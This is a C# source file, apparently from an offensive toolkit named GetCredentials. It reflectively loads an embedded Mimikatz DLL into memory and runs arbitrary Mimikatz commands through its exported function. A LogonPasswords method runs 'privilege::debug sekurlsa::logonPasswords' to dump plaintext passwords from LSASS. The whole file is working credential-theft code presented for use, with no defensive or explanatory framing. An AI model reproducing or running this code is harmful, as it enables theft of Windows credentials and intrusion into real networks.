using System;
using System.Text;
using System.Threading;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using GetCredentials.lib.Execution;
namespace GetCredentials.lib
{
    public class Mimikatz
    {
        private static byte[] PEBytes32 { get; set; }
        private static byte[] PEBytes64 { get; set; }
        private static PE MimikatzPE { get; set; } = null;
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate IntPtr MimikatzType(IntPtr command);

        /// <summary>
        /// Loads the Mimikatz PE with `PE.Load()` and executes a chosen Mimikatz command.
        /// </summary>
        /// <param name="Command">Mimikatz command to be executed.</param>
        /// <returns>Mimikatz output.</returns>
        public static string Command(string Command)
        {
            // Console.WriteLine(String.Join(",", System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames()));
            if (MimikatzPE == null)
            {
                string[] manifestResources = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames();
                if (IntPtr.Size == 4 && MimikatzPE == null)
                {
                    if (PEBytes32 == null)
                    {
                        PEBytes32 = Utilities.GetEmbeddedResourceBytes("powerkatz_x86.dll");
                        if (PEBytes32 == null) { return ""; }
                    }
                    MimikatzPE = PE.Load(PEBytes32);
                }
                else if (IntPtr.Size == 8 && MimikatzPE == null)
                {
                    if (PEBytes64 == null)
                    {
                        PEBytes64 = Utilities.GetEmbeddedResourceBytes("powerkatz_x64.dll");
                        if (PEBytes64 == null) { return ""; }
                    }
                    MimikatzPE = PE.Load(PEBytes64);
                }
            }
            if (MimikatzPE == null) { return ""; }
            IntPtr functionPointer = MimikatzPE.GetFunctionExport("powershell_reflective_mimikatz");
            if (functionPointer == IntPtr.Zero) { return ""; }

            MimikatzType mimikatz = (MimikatzType)Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(MimikatzType));
            IntPtr input = Marshal.StringToHGlobalUni(Command);
            try
            {
                IntPtr output = IntPtr.Zero;
                Thread t = new Thread(() =>
                {
                    try
                    {
                        output = mimikatz(input);
                    }
                    catch (Exception e)
                    {
                        Console.Error.WriteLine("MimikatzException: " + e.Message + e.StackTrace);
                    }
                });
                t.Start();
                t.Join();
                Marshal.FreeHGlobal(input);
                if (output == IntPtr.Zero)
                {
                    return "";
                }
                string stroutput = Marshal.PtrToStringUni(output);
                Win32.Kernel32.LocalFree(output);
                return stroutput;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("MimikatzException: " + e.Message + e.StackTrace);
                return "";
            }
        }

        /// <summary>
        /// Loads the Mimikatz PE with `PE.Load()` and executes the Mimikatzcommand to retrieve plaintext
        /// passwords from LSASS. Equates to `Command("privilege::debug sekurlsa::logonPasswords")`. (Requires Admin)
        /// </summary>
        /// <returns>Mimikatz output.</returns>
        public static string LogonPasswords()
        {
            return Command("privilege::debug sekurlsa::logonPasswords");
        }
    }
}
